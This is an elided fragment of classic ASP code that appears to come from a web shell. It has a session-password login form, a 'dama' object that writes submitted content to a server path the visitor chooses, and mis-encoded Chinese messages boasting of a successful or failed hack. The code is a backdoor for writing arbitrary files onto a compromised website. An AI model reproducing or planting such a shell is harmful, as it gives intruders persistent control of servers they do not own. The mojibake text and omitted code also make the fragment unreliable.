...
If Session("mgler")<>Userpwd Then
  ...
  Else
    ...
    RW=RW & "<b>Password£º</b><input name='pwd' type='password' size='15' style='font-size: 12px;border: menu 1px solid'>"
...
<%dama.write data%>
<%if err=0 then%>
<%="<b><font style=color:red;>±¬¾Õ³É¹¦,¹§Ï²Äã!</font></b>"%>
<%else%>
<%="<b><font style=color:red;>±¬¾ÕÊ§°Ü¨r(¨s¨Œ¨t)¨q</font></b>"%>
<%end if%>
<%err.clear%>
<%end if%>
<%dama.close%>
...
<%="<font style=color:BLUE;>Â·¾¶: </font><input type=text name=path size=46>"%>
<%="<br><font style=color:BLUE;>ÎÄ¼þµØÖ·: </font><font style=color:red;>"%>
